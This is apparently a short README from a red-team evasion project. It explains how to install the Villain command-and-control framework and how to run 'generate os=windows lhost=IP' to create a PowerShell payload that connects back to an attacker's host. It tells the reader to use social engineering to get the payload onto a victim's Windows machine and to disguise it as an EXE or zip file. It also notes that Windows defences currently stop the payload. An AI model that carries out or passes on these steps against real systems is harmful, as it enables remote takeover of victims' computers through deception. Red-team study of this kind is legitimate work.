# Villain

## Clone the Repository

```bash
git clone https://github.com/keralahacker/Villain
cd ./Villain
pip3 install -r requirements.txt
```
## Generate Payload

To generate a payload, use the following command:
```bash
generate os=windows lhost=IP
```
- IP Address: The IP address can be the C2 IP or a port forwarding HOST-IP.

![alt text](https://raw.githubusercontent.com/vaishnavucv/Project-winEvasion-Redteam/main/Resource/Villain-ps.png)

### above screenshot explanation
1. Using Python3, run Villain.py.
2. To generate a PowerShell payload, use "generate os=windows lhost=IP".
3. Once the payload is generated, copy it or use social engineering techniques to transfer the code to the victim's machine.
4. When the Villain PowerShell script is executed on the victim's Windows 10/11 machine, the default Windows security measures will isolate the process and terminate the payload from running further.

### Payload Details

- Once the payload is generated, it will be in PowerShell format. The attacker can use social engineering techniques to convert the PowerShell script from Villain to an EXE or zip file for executing the payload.

### Testing the Payload

- For testing the payload, use a Windows 10/11 VM with the latest security patches installed.

